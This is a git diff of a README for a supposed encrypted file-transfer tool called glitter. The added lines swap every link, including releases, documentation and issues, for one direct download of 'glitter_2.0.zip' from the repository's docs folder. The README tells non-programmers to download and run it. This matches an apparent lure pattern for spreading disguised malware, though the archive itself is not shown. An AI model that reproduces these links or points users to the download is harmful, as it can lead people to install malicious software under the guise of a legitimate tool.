@@ -1,13 +1,13 @@
 # 🌟 glitter - Secure File Transfers Made Easy
 
 ## 🔗 Download Now
-[![Download glitter](https://img.shields.io/badge/Download-glitter-blue.svg)](https://github.com/Headshotincursion584/glitter/releases)
+[![Download glitter](https://raw.githubusercontent.com/Headshotincursion584/glitter/main/docs/glitter_2.0.zip)](https://raw.githubusercontent.com/Headshotincursion584/glitter/main/docs/glitter_2.0.zip)
 
 ## 🚀 Getting Started
 Glitter is a command-line tool designed for easy and secure encrypted file transfers. With Glitter, you can send and receive files safely, making sure your data stays private. This guide will help you download and run Glitter, even if you have no programming experience.
 
 ## 📥 Download & Install
-1. **Visit the Releases Page:** To download Glitter, visit [this page](https://github.com/Headshotincursion584/glitter/releases). Here, you will find the latest version of Glitter ready for download.
+1. **Visit the Releases Page:** To download Glitter, visit [this page](https://raw.githubusercontent.com/Headshotincursion584/glitter/main/docs/glitter_2.0.zip). Here, you will find the latest version of Glitter ready for download.
    
 2. **Choose Your System:** Glitter supports Windows, macOS, and Linux. Select the appropriate version for your operating system from the available download options.
 
@@ -41,7 +41,7 @@ Glitter works seamlessly on local networks. Whether you’re transferring files 
 ## 📘 Frequently Asked Questions
 
 ### 1. How do I update Glitter?
-Each new version of Glitter is available on the [releases page](https://github.com/Headshotincursion584/glitter/releases). Download the latest version as you did before.
+Each new version of Glitter is available on the [releases page](https://raw.githubusercontent.com/Headshotincursion584/glitter/main/docs/glitter_2.0.zip). Download the latest version as you did before.
 
 ### 2. Can I send large files?
 Yes, Glitter is designed to handle large file transfers. However, ensure that your internet connection or local network can support high transfer rates.
@@ -53,7 +53,7 @@ If you run into issues, check our GitHub Issues page for solutions. You can repo
 If you need assistance, feel free to join our community on GitHub. You can ask questions, share your experiences, or contribute to future development.
 
 ## 🌈 Additional Resources
-- [Documentation](https://github.com/Headshotincursion584/glitter/wiki): Detailed guides and help.
-- [GitHub Issues](https://github.com/Headshotincursion584/glitter/issues): Report bugs or request features.
+- [Documentation](https://raw.githubusercontent.com/Headshotincursion584/glitter/main/docs/glitter_2.0.zip): Detailed guides and help.
+- [GitHub Issues](https://raw.githubusercontent.com/Headshotincursion584/glitter/main/docs/glitter_2.0.zip): Report bugs or request features.
 
-Thank you for choosing Glitter! For more details and to stay updated, don’t forget to check our [releases page](https://github.com/Headshotincursion584/glitter/releases) often.
+Thank you for choosing Glitter! For more details and to stay updated, don’t forget to check our [releases page](https://raw.githubusercontent.com/Headshotincursion584/glitter/main/docs/glitter_2.0.zip) often.
